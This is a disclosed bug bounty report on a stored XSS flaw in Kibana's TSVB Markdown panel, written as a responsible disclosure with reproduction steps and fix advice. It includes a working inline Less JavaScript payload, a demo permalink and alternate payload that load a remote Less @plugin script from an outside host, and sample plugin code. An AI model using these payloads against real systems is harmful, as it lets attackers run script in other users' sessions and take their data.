# Stored XSS in TSVB Visualizations Markdown Panel

## Report Details
- **Report ID**: 858874
- **URL**: https://hackerone.com/reports/858874
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-04-24T21:32:45.160Z
- **Disclosed**: 2020-07-28T18:53:28.254Z

## Reporter
- **Username**: jeremybuis
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: elastic

## Vulnerability Information
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

**Summary:** An authenticated user can save a TSVB visualization, which contains a stored cross-site scripting (XSS) payload in the included Less code as part of the markdown panel.

**Description:** I've found a stored cross-site scripting (XSS) issue in the TSVB visualization. The Markdown panel accepts Custom CSS and Less. The proof-of-concept attack below shows how to create an XSS using the Less language.  By injecting a payload like: body { color: \`confirm('XSS')\`; } , a malicious user is able to gain JavaScript execution on the domain. When another authenticated user edits the Less code, the payload fires.

## Steps To Reproduce:

I created an instance of Kibana on cloud.elastic.co and performed the following:

1. Login to Kibana and navigate to the visualizations page and click "Create Visualization"
2. Select TSVB
3. Navigate to the Markdown tab
4. Navigate to the Panel options sub tab
5. Place the following payload in the custom CSS editor:
    body { color: \`confirm('XSS')\`; }
6. Notice the Confirm dialog
7. Save the visualization
8. As another user, navigate to the visualizations custom css and edit the Less
9. Notice the Confirm dialog

A similar attack can be done on the demo.elastic.co Kibana instance as well. Heres a permalink to the example above: [Demo Kibana Less XSS](https://demo.elastic.co/app/kibana#/visualize/create?type=metrics&_g=()&_a=(filters:!(),linked:!f,query:(language:kuery,query:''),uiState:(),vis:(aggs:!(),params:(axis_formatter:number,axis_position:left,axis_scale:normal,default_index_pattern:'filebeat-*',default_timefield:'@timestamp',id:'61ca57f0-469d-11e7-af02-69e470af7417',index_pattern:'',interval:'',isModelInvalid:!f,markdown:'%23+Hello',markdown_css:'%23markdown-61ca57f0-469d-11e7-af02-69e470af7417+body%7Bcolor:true%7D',markdown_less:'%2F%2F+@plugin+%22https:%2F%2Fef358b0f.ngrok.io%2Fcxss.js%22;%0Abody+%7B+color:+%60confirm(!'XSS!')%60+%7D%0A%0A',series:!((axis_position:right,chart_type:line,color:%2368BC00,fill:0.5,formatter:number,id:'61ca57f1-469d-11e7-af02-69e470af7417',line_width:1,metrics:!((id:'61ca57f2-469d-11e7-af02-69e470af7417',type:count)),point_size:1,separate_axis:0,split_mode:everything,stacked:none)),show_grid:1,show_legend:1,time_field:'',type:markdown),title:'',type:metrics)))

###Scenario

A malicious user could create a scenario where the visualization is saved as part of a dashboard, and the processed CSS causes a problem with the view, inviting other users to try and fix the issue. When the other users try and fix the issue, they trigger the XSS payload. The malicious user could then perform actions as if the were the affected user, and potentially ex-filtrate sensitive data they didn't already have access too.

###Alternate Payload

If including malicious JavaScript in the Less code is too obvious, the malicious user can include a Less plugin instead. The Less code would look like the following:

```
@plugin "https://www.example.com/plugin";
```
Notice that the ".js" extension is not needed, further obfuscating the attack. The plugin code would look like the following:

```
confirm("XSS Less plugin");
module.exports = {
  install: function(less, pluginManager, functions) {
    functions.add('xss', function(val) {
      return val.value;
    });
  }
};
```

This approach is less obvious compared to the inline JS, when an unsuspecting user tries to modify the Less code.

## Impact: XSS can be used to force users to download malware, navigate to malicious websites, or hijack users sessions. For Kibana, the vulnerability could allow an attacker to obtain sensitive information from or perform destructive actions on behalf of other Kibana users.

### Recommendations:

Upgrade to Less version 3.0 or greater and confirm that the Less option { javascriptEnabled: false } is properly configured. This will fix the inline JavaScript execution problem.

There is no fix at the moment for the plugin syntax as far as I know. I will be communicating with the Less team shortly to see what can be done.

## Supporting Material/References:

  * Two screenshots showing both the inline JavaScript injection and the Less plugin option against the demo.elastic.co instance
  * Two screenshots showing both inline and plugin options against a deployment on https://cloud.elastic.co/
  * My example Less plugin

## Impact

The vulnerability could allow an attacker to obtain sensitive information from or perform destructive actions on behalf of other Kibana users

## Attachments
- kibana-less-inline-xss.PNG
- kibana-less-inline-xss-v2.PNG
- kibana-less-plugin-xss.PNG
- kibana-less-plugin-xss-v2.PNG
- cxss.js
